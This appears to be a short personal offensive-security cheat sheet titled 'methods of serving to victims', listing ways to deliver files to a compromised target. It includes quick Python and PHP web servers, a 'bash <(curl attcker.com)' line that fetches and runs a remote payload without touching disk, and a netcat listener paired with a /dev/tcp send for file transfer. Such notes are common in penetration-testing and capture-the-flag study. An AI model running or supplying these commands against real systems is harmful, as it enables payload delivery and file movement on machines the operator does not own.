# methods of serving to victims

- MAKE a www directory!!!
- MAKE a www directory!!!
- MAKE a www directory!!!


> python web server
```
python3 -m http.server PORT_NUM
```

> PHP
```php
php -S 0.0.0.0:PORT_NUM
```

> if given command execution	
```sh
we can pipe the output of curl/wget to the shell of our choice avoiding touching disk
bash <(curl attcker.com)
```


> nc/named pipes in unix environment
```bash
useful for basic files
2 stages
	stage1: setup the target
		nc -lvnp PORT_NUM > OUT_FILE
	stage2: send the file
		cat SOME_TEXT_FILE | /dev/tcp/TARGET_IP/TARGET_PORT
```

> preserving "last modified" field
```sh
step1: copy link/download link
step2: wget the copied link

```




